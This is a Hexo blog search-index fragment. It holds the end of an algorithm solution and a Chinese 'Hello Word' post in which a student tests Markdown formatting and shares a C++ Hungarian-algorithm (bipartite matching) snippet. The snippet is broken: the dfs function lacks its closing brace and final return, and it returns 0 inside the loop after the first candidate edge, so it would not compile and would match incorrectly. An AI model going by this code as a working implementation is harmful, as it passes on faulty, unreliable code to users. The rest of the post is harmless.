class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;c[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello Word ！</title>
    <url>/2017/05/17/55549e4a9621/</url>
    <content><![CDATA[<h1 id="Hello-Word"><a href="#Hello-Word" class="headerlink" title="Hello Word !"></a>Hello Word !</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><blockquote>
<p>这个博客诞生了，超级期待以后这个博客能一直陪伴着我整个OI，ACM，程序开发的生涯，这将记录下来我的点点滴滴的，这是我人生中最宝贵的收获。<br>——Xorex</p>
<blockquote>
<p>其实最神奇的是可以嵌套使用啊QAQ</p>
</blockquote>
</blockquote>
<h2 id="2-各种尝试"><a href="#2-各种尝试" class="headerlink" title="2.各种尝试"></a>2.各种尝试</h2><blockquote>
<p>-第一项</p>
</blockquote>
<blockquote>
<p>-第二项</p>
</blockquote>
<blockquote>
<p>-第三项</p>
</blockquote>
<blockquote>
<p>-第四项</p>
</blockquote>
<blockquote>
<p>-第五项</p>
</blockquote>
<p>然后激动地我开始敲了一段二分图匹配的匈牙利算法</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">555</span>;<span class="comment">///两边的最大数量</span></span><br><span class="line"><span class="keyword">bool</span> tu[N][N];</span><br><span class="line"><span class="keyword">int</span> from[N];<span class="comment">///记录右边的点如果配对好了它来自哪里</span></span><br><span class="line"><span class="keyword">bool</span> use[N];<span class="comment">///记录右边的点是否已经完成了配对</span></span><br><span class="line"><span class="keyword">int</span> n,m;<span class="comment">///m,n分别表示两边的各自数量,n是左边，m是右边</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)<span class="comment">///m是右边，所以这里上界是m</span></span><br><span class="line">    <span class="keyword">if</span>(!use[i]&amp;&amp;tu[x][i])</span><br><span class="line">    &#123;</span><br><span class="line">        use[i]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(from[i]==<span class="number">-1</span>||dfs(from[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            from[i]=x;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hungary</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(from,<span class="number">-1</span>,<span class="keyword">sizeof</span>(from));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="comment">///n是左边，所以这里上界是n</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(use,<span class="number">0</span>,<span class="keyword">sizeof</span>(use));</span><br><span class="line">        <span class="keyword">if</span>(dfs(i))</span><br><span class="line">        tot++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<hr>
<hr>
<p><del>三种分割线用的真爽啊QAQ</del></p>
<table>
<thead>
<tr>
<th align="center">上午</th>
<th align="center">下午</th>
<th align="center">晚上</th>
</tr>
</thead>
<tbody><tr>
<td align="center">看小说</td>
<td align="center">联机CS</td>
<td align="center">敲水题</td>
</tr>
<tr>
<td align="center">聊QQ</td>
<td align="center">QQ空间</td>
<td align="center">睡觉</td>
</tr>
<tr>
<td align="center">上知乎</td>
<td align="center">上bilibili</td>
<td align="center">看动漫</td>
</tr>
</tbody></table>
<blockquote>
<p>上面的计划表是不是非常exciting？？？</p>
</blockquote>
<p>但是不可能啊，少年如果你不想NOIP一结束就滚回去学文化的话</p>
<p>所以说少年你还是努力吧……</p>
<p>这是我的独立博客 <a href="https://xorex.space/">Xorex</a></p>
<p><strong>没错少年你需要努力啊！</strong></p>
<p><strong>你不努力就等着混吃等死！！</strong></p>
<p><strong>所以赶快去敲代码！！！</strong></p>
<p><strong>下面附上一个四糸乃的图片QAQ</strong></p>
<p><img src="https://xorex.space/image/008.jpg"></p>
<blockquote>
<p>然后我就要试一下各种符号的使用了</p>
</blockquote>
<p><code>()</code></p>
<p><code>[]</code></p>
<p><code>@</code></p>
<p><code>#</code></p>
<p><code>&amp;</code></p>
<p><code>&#123;&#125;</code></p>
<p><code>~</code></p>
<p><code>^</code></p>
<p><code>%</code></p>
<p><code>$</code></p>
<p><code>?</code></p>
<p>任务计划表？？？</p>
<ul>
<li><p>First</p>
</li>
<li><p>Second</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>更简洁</th>
<th>更明了的解决方法</th>
</tr>
</thead>
<tbody><tr>
<td>只需要一个符号就行</td>
<td>真的是太强大了!</td>
</tr>
</tbody></table>
<p><del>要是不用学文化课该多好</del></p>
<p><strong>发几个表情来表示自己的激动之情！！！</strong></p>
<p>:heart_eyes:<br>:blush:<br>:joy:<br>:satisfied:</p>
<blockquote>
<p>然后我的博客到这里就已经结束了了，尝试了很多的用法非常开心，最后附上学习的小姐姐博客的网址<a href="https://baoyuzhang.github.io/2017/05/05/%E3%80%90Hexo%E6%90%AD%E5%BB%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2%E5%85%A8%E7%BA%AA%E5%BD%95%E3%80%91%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BD%BF%E7%94%A8Markdown/">浅茉</a>，超级感谢她写的博客！</p>
</blockquote>
<p><strong>真的就像是最开始接触程序的时候敲出来HelloWord的时候的心情啊!</strong> :hushed:</p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
</search>
